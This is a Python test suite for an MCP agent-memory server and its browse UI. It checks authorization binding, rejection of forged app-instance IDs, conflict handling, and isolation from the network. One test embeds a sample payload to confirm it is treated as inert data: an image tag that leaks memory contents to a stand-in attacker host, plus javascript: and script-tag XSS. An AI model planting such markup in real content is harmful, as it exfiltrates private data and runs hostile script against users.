from __future__ import annotations

from dataclasses import replace
import json
import re

import pytest
from fastmcp import Client, FastMCPApp

from agent_filetree_memory.domain.errors import (
    IdempotencyConflict,
    VersionConflict,
)
from agent_filetree_memory.domain.models import MemoryAction, Scope
from agent_filetree_memory.mcp import create_mcp_server

PRIVATE_PATH = "/private/canary.md"
PRIVATE_CONTENT = "# PRIVATE-CONTENT-CANARY\n\nOnly the verified agent can read this."


def _component_types(value: object) -> list[str]:
    found: list[str] = []
    if isinstance(value, dict):
        if isinstance(value.get("type"), str):
            found.append(value["type"])
        for child in value.values():
            found.extend(_component_types(child))
    elif isinstance(value, list):
        for child in value:
            found.extend(_component_types(child))
    return found


def _backend_name(payload: dict, local_name: str) -> str:
    match = re.search(
        rf"[0-9a-f]{{12}}_{re.escape(local_name)}",
        json.dumps(payload),
    )
    assert match is not None
    return match.group(0)


def _app_instance_id(payload: dict) -> str:
    matches = set(
        re.findall(
            r'"app_instance_id"\s*:\s*"([A-Za-z0-9_-]+)"',
            json.dumps(payload),
        )
    )
    assert len(matches) == 1
    return matches.pop()


def _with_app_instance(payload: dict, **arguments: object) -> dict[str, object]:
    return {"app_instance_id": _app_instance_id(payload), **arguments}


async def test_app_exposes_one_model_entry_and_marks_helpers_app_only(
    service, resolver
):
    server = create_mcp_server(service, resolver, include_app=True)

    async with Client(server) as client:
        tools = {tool.name: tool for tool in await client.list_tools()}

    assert set(tools) == {
        "memory_list",
        "memory_read",
        "memory_write",
        "memory_append",
        "memory_delete",
        "memory_browse",
    }
    browse = tools["memory_browse"]
    assert browse.inputSchema["properties"] == {}
    assert browse.meta["ui"]["visibility"] == ["model"]
    assert re.fullmatch(
        r"ui://prefab/tool/[0-9a-f]{12}/renderer\.html",
        browse.meta["ui"]["resourceUri"],
    )

    app = next(
        provider
        for provider in server.providers
        if isinstance(provider, FastMCPApp)
    )
    app_tools = {tool.name: tool for tool in await app.list_tools()}
    assert set(app_tools) == {
        "ui_memory_list",
        "ui_memory_read",
        "ui_memory_save",
        "ui_memory_append",
        "ui_memory_delete",
        "memory_browse",
    }
    for name in set(app_tools) - {"memory_browse"}:
        assert app_tools[name].meta["ui"]["visibility"] == ["app"]
        assert not (
            set(app_tools[name].parameters["properties"])
            & {
                "workspace_id",
                "principal_id",
                "agent_profile_id",
                "capability_token",
            }
        )


async def test_open_payload_bootstraps_without_plaintext_memory_or_scope(
    service, resolver
):
    server = create_mcp_server(service, resolver, include_app=True)

    async with Client(server) as client:
        result = await client.call_tool("memory_browse", {})

    payload = result.structured_content
    encoded = json.dumps(payload)
    assert result.is_error is False
    assert "load only inside the app" in result.content[0].text
    assert PRIVATE_PATH not in encoded
    assert PRIVATE_CONTENT not in encoded
    for opaque_scope_value in (
        "workspace-secret",
        "principal-secret",
        "agent-secret",
    ):
        assert opaque_scope_value not in encoded
    assert service.calls == []
    assert [action for _, action in resolver.calls] == [MemoryAction.LIST]

    state = payload["state"]
    assert state["listing"]["documents"] == []
    assert state["draft_content"] == ""
    assert state["selected"] == {}
    component_types = _component_types(payload["view"])
    assert "Textarea" in component_types
    assert "Dialog" in component_types
    assert "Text" in component_types
    assert "Markdown" not in component_types
    for local_name in (
        "ui_memory_list",
        "ui_memory_read",
        "ui_memory_save",
        "ui_memory_append",
        "ui_memory_delete",
    ):
        assert _backend_name(payload, local_name)


async def test_ui_backend_calls_are_hashed_and_use_current_context(
    service, resolver
):
    server = create_mcp_server(service, resolver, include_app=True)

    async with Client(server) as client:
        opened = await client.call_tool("memory_browse", {})
        list_name = _backend_name(opened.structured_content, "ui_memory_list")
        read_name = _backend_name(opened.structured_content, "ui_memory_read")
        listing = await client.call_tool(
            list_name,
            _with_app_instance(opened.structured_content, path="/private"),
        )
        document = await client.call_tool(
            read_name,
            _with_app_instance(opened.structured_content, path=PRIVATE_PATH),
        )

    assert listing.data["documents"][0]["path"] == PRIVATE_PATH
    assert document.data["content"] == PRIVATE_CONTENT
    assert [action for _, action in resolver.calls] == [
        MemoryAction.LIST,
        MemoryAction.LIST,
        MemoryAction.READ,
    ]


@pytest.mark.parametrize(
    ("error", "expected_code"),
    [
        (VersionConflict("conflict"), "version_conflict"),
        (IdempotencyConflict("conflict"), "idempotency_conflict"),
    ],
)
async def test_ui_save_returns_visible_conflict_and_preserves_draft(
    service, resolver, error, expected_code
):
    service.write_error = error
    server = create_mcp_server(service, resolver, include_app=True)

    async with Client(server) as client:
        opened = await client.call_tool("memory_browse", {})
        save_name = _backend_name(opened.structured_content, "ui_memory_save")
        result = await client.call_tool(
            save_name,
            _with_app_instance(
                opened.structured_content,
                path=PRIVATE_PATH,
                content="# UNSAVED-DRAFT",
                expected_version=6,
                idempotency_key="retry-1",
            ),
        )

    assert result.data["ok"] is False
    assert result.data["code"] == expected_code
    assert result.data["draft_content"] == "# UNSAVED-DRAFT"
    assert result.data["selected"]["content"] == PRIVATE_CONTENT
    assert result.data["current_version"] == 7
    assert result.data["next_idempotency_key"] != "retry-1"
    assert [action for _, action in resolver.calls] == [
        MemoryAction.LIST,
        MemoryAction.WRITE,
    ]


async def test_app_instance_survives_fresh_invocation_for_same_agent_profile(
    service, resolver
):
    server = create_mcp_server(
        service,
        resolver,
        include_app=True,
        app_instance_signing_key=b"app-instance-test-key-material!!",
    )

    async with Client(server) as client:
        opened = await client.call_tool("memory_browse", {})
        list_name = _backend_name(opened.structured_content, "ui_memory_list")
        resolver.invocation = replace(
            resolver.invocation,
            invocation_id="invocation-2",
            capability_id="capability-2",
        )
        listing = await client.call_tool(
            list_name,
            _with_app_instance(opened.structured_content, path="/private"),
        )

    assert listing.data["documents"][0]["path"] == PRIVATE_PATH
    assert service.calls[-1][1] is resolver.invocation


@pytest.mark.parametrize(
    "changed_binding",
    ["workspace", "agent_profile", "principal", "issuer", "audience"],
)
async def test_app_instance_rejects_cross_identity_or_cross_agent_reuse(
    service, resolver, changed_binding
):
    server = create_mcp_server(
        service,
        resolver,
        include_app=True,
        app_instance_signing_key=b"app-instance-test-key-material!!",
    )

    async with Client(server) as client:
        opened = await client.call_tool("memory_browse", {})
        read_name = _backend_name(opened.structured_content, "ui_memory_read")
        current = resolver.invocation
        if changed_binding in {"workspace", "agent_profile"}:
            scope_values = {
                "workspace_id": current.scope.workspace_id,
                "agent_profile_id": current.scope.agent_profile_id,
            }
            scope_values[
                {
                    "workspace": "workspace_id",
                    "agent_profile": "agent_profile_id",
                }[changed_binding]
            ] = f"different-{changed_binding}"
            resolver.invocation = replace(current, scope=Scope(**scope_values))
        else:
            resolver.invocation = replace(
                current,
                **{f"{changed_binding}_id" if changed_binding == "principal" else changed_binding: f"different-{changed_binding}"},
            )
        service.calls.clear()
        result = await client.call_tool(
            read_name,
            _with_app_instance(opened.structured_content, path=PRIVATE_PATH),
            raise_on_error=False,
        )

    assert result.is_error is True
    assert "memory operation is not authorized" in result.content[0].text
    assert "different-" not in result.content[0].text
    assert service.calls == []


async def test_app_instance_is_required_and_forgery_fails_before_storage(
    service, resolver
):
    server = create_mcp_server(
        service,
        resolver,
        include_app=True,
        app_instance_signing_key=b"app-instance-test-key-material!!",
    )

    async with Client(server) as client:
        opened = await client.call_tool("memory_browse", {})
        read_name = _backend_name(opened.structured_content, "ui_memory_read")
        instance = _app_instance_id(opened.structured_content)
        replacement = "A" if instance[-1] != "A" else "B"
        missing = await client.call_tool(
            read_name,
            {"path": PRIVATE_PATH},
            raise_on_error=False,
        )
        forged = await client.call_tool(
            read_name,
            {"path": PRIVATE_PATH, "app_instance_id": instance[:-1] + replacement},
            raise_on_error=False,
        )

    assert missing.is_error is True
    assert forged.is_error is True
    assert "memory operation is not authorized" in forged.content[0].text
    assert service.calls == []


async def test_untrusted_markdown_is_data_not_an_active_renderer(
    service, resolver
):
    malicious = (
        '<img src="https://attacker.invalid/leak?memory=secret">\n'
        '[click](javascript:alert(document.domain))\n<script>alert(1)</script>'
    )
    service.snapshot = replace(service.snapshot, content=malicious)
    server = create_mcp_server(service, resolver, include_app=True)

    async with Client(server) as client:
        opened = await client.call_tool("memory_browse", {})
        read_name = _backend_name(opened.structured_content, "ui_memory_read")
        document = await client.call_tool(
            read_name,
            _with_app_instance(opened.structured_content, path=PRIVATE_PATH),
        )

    assert malicious not in json.dumps(opened.structured_content)
    assert document.data["content"] == malicious
    component_types = _component_types(opened.structured_content["view"])
    assert "Textarea" in component_types
    assert "Text" in component_types
    assert "Markdown" not in component_types


async def test_app_resource_is_bundled_mcp_app_with_no_network_csp(
    service, resolver, monkeypatch
):
    monkeypatch.delenv("PREFAB_RENDERER_URL", raising=False)
    monkeypatch.delenv("PREFAB_BUNDLED_RENDERER", raising=False)
    server = create_mcp_server(service, resolver, include_app=True)

    async with Client(server) as client:
        tools = {tool.name: tool for tool in await client.list_tools()}
        resources = await client.list_resources()
        assert len(resources) == 1
        resource = resources[0]
        contents = await client.read_resource(resource.uri)

    assert str(resource.uri) == tools["memory_browse"].meta["ui"]["resourceUri"]
    assert resource.mimeType == "text/html;profile=mcp-app"
    assert resource.meta["ui"] == {}
    assert contents[0].mimeType == "text/html;profile=mcp-app"
    html = contents[0].text
    head = html.split("</head>", 1)[0]
    assert len(html) > 1_000_000
    assert not re.search(r"(?:src|href)=[\"']https?://", head)
    assert PRIVATE_CONTENT not in html
